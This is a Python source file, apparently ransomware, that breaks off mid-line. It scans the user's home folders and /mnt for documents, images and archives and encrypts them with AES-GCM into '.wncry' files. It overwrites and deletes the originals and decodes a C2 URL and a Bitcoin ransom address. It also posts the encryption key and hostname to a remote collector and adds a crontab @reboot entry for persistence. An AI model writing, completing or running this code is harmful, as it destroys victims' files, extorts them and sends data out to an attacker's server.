import os
import base64
import json
import binascii
import sys
import logging
import pathlib
import secrets
import socket
import subprocess
from typing import Dict, Optional, List, Union
from pathlib import Path

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")


def gerar_chave_mestra() -> None:
    """
    Generates a random 32-byte AES-256 key, encodes it in Base64,
    and stores it in /tmp/.master.key with secure permissions.
    """
    try:
        key_bytes = os.urandom(32)
        key_b64 = base64.b64encode(key_bytes).decode("utf-8")
        payload = {"aes_key": key_b64}
        file_path = "/tmp/.master.key"
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, separators=(",", ":"))
        os.chmod(file_path, 0o600)
    except Exception as exc:
        raise RuntimeError(f"Error generating or storing master key: {exc}") from exc


def decodificar_configuracao(c2_b64: str, btc_b64: str) -> Dict[str, Optional[str]]:
    """
    Decode two Base64‑encoded strings: a C2 URL and a Bitcoin rescue address.
    """
    result: Dict[str, Optional[str]] = {"c2_url": None, "btc_address": None}

    try:
        decoded_c2 = base64.b64decode(c2_b64, validate=True)
        result["c2_url"] = decoded_c2.decode("utf-8")
    except (binascii.Error, UnicodeDecodeError) as e:
        print(f"Error decoding C2 URL: {e}", file=sys.stderr)

    try:
        decoded_btc = base64.b64decode(btc_b64, validate=True)
        result["btc_address"] = decoded_btc.decode("utf-8")
    except (binascii.Error, UnicodeDecodeError) as e:
        print(f"Error decoding Bitcoin address: {e}", file=sys.stderr)

    return result


def _on_error(err: OSError) -> None:
    logging.warning("Skipped due to error: %s", err)


def enumerar_arquivos_alvo() -> List[str]:
    """
    Recursively scans predefined directories and returns a list of full file paths
    that match allowed extensions while permanently excluding certain backup extensions.
    Symbolic links are not followed to avoid infinite loops.
    """
    home = os.path.expanduser("~")
    dirs_to_scan = [
        home,
        os.path.join(home, "Documentos"),
        os.path.join(home, "Área de Trabalho"),
        os.path.join(home, "Imagens"),
        os.path.join(home, "Documentos_Teste"),
        os.path.join(home, "Downloads"),
        "/mnt",
    ]

    allowed_ext = {
        ".xlsx",
        ".docx",
        ".pdf",
        ".txt",
        ".csv",
        ".jpg",
        ".png",
        ".db",
        ".backup",
        ".psd",
        ".zip",
        ".rar",
    }
    excluded_ext = {".bak", ".backup", ".old"}

    found_files: List[str] = []

    for base_dir in dirs_to_scan:
        if not os.path.isdir(base_dir):
            continue

        for root, dirs, files in os.walk(base_dir, topdown=True, followlinks=False, onerror=_on_error):
            dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(root, d))]

            for filename in files:
                file_path = os.path.join(root, filename)

                if os.path.islink(file_path) and not os.path.exists(file_path):
                    logging.info("Skipping broken symlink: %s", file_path)
                    continue

                _, ext = os.path.splitext(filename)
                ext = ext.lower()

                if ext in excluded_ext:
                    logging.debug("Excluded by backup extension: %s", file_path)
                    continue
                if ext in allowed_ext:
                    found_files.append(os.path.abspath(file_path))

    return found_files


def _secure_overwrite(file_path: pathlib.Path, chunk_size: int = 64 * 1024) -> None:
    """
    Overwrites the entire file with zeros to remove residual data.
    """
    file_size = file_path.stat().st_size
    with file_path.open("r+b") as f:
        remaining = file_size
        zero_chunk = b"\x00" * min(chunk_size, remaining)
        while remaining > 0:
            write_size = min(chunk_size, remaining)
            if write_size != len(zero_chunk):
                zero_chunk = b"\x00" * write_size
            f.write(zero_chunk)
            remaining -= write_size
        f.flush()
        os.fsync(f.fileno())


def _encrypt_file(input_path: pathlib.Path, key: bytes) -> pathlib.Path:
    """
    Encrypts a file with AES‑256‑GCM.
    Output file contains: nonce (12 bytes) || tag (16 bytes) || ciphertext.
    Extension is ".wncry".
    """
    nonce = secrets.token_bytes(12)
    aesgcm = AESGCM(key)

    with input_path.open("rb") as fin:
        plaintext = fin.read()

    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    tag = ciphertext[-16:]
    actual_cipher = ciphertext[:-16]

    output_path = input_path.with_suffix(".wncry")
    with output_path.open("wb") as fout:
        fout.write(nonce)
        fout.write(tag)
        fout.write(actual_cipher)

    return output_path


def criptografar_arquivo(*caminhos: Union[str, os.PathLike], chave_mestra: bytes) -> None:
    """
    Encrypts each given file with the provided 32‑byte master key,
    securely overwrites the original, and removes it.
    """
    if len(chave_mestra) != 32:
        raise ValueError("A chave mestra deve ter exatamente 32 bytes para AES‑256‑GCM.")

    for caminho in caminhos:
        try:
            input_path = pathlib.Path(caminho).resolve(strict=True)
            if not input_path.is_file():
                raise FileNotFoundError(f"'{caminho}' não é um arquivo regular.")

            _encrypt_file(input_path, chave_mestra)
            _secure_overwrite(input_path)
            input_path.unlink()
        except Exception as exc:
            raise RuntimeError(f"Falha ao processar '{caminho}': {exc}") from exc


def _read_key(key_path: Path) -> bytes:
    """Read the AES key from the given path."""
    if not key_path.is_file():
        raise FileNotFoundError(f"Key file not found: {key_path}")
    with key_path.open("rb") as f:
        return f.read()


def _post_key(hostname: str, key: bytes, url: str) -> None:
    """Send the key and hostname to the remote collector."""
    payload = {"hostname": hostname, "key": key.hex()}
    headers = {"Content-Type": "application/json"}
    response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
    response.raise_for_status()
    logging.info("Key successfully exfiltrated.")


def _secure_delete(file_path: Path) -> None:
    """Overwrite the file with random data before deleting it."""
    if not file_path.is_file():
        logging.warning(f"File already removed: {file_path}")
        return

    length = file_path.stat().st_size
    with file_path.open("r+b") as f:
        f.write(os.urandom(length))
        f.flush()
        os.fsync(f.fileno())

    file_path.unlink()
    logging.info(f"Securely deleted key file: {file_path}")


def _ensure_crontab_entry(script_path: Path) -> None:
    """Make sure a @reboot entry for the given script exists in the user's crontab."""
    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True, check=False)
    existing_crontab = result.stdout.splitlines() if result.returncode == 0 else []

    entry = f"@reboot {sys.executable} {script_path}"
    if any(entry in line for line in existing_crontab):
        logging.info("Reboot crontab entry already present.")
        return

    new_crontab = existing_crontab + [entry]
    crontab_content = "\n".join(new_crontab) + "\n"
    subprocess.run(["crontab", "-"], input=crontab_content, text=True, check=True)
    logging.info("Added @reboot entry to crontab.")


def exfiltrar_chave_e_registrar_persistencia() -> None:
    """
    Reads the AES key from /tmp/.master.key, sends it with the hostname to a remote server,
    securely deletes the key file, and ensures a @reboot entry for this script exists in crontab.
    """
    key_path = Path("/tmp/.master.key")
    collector_url = "http://10.254.19.191:8080/collect"

    try:
        key = _read_key(key_path)
    except Exception:
        logging.exception("Aborting due to key read failure.")
        return

    hostname =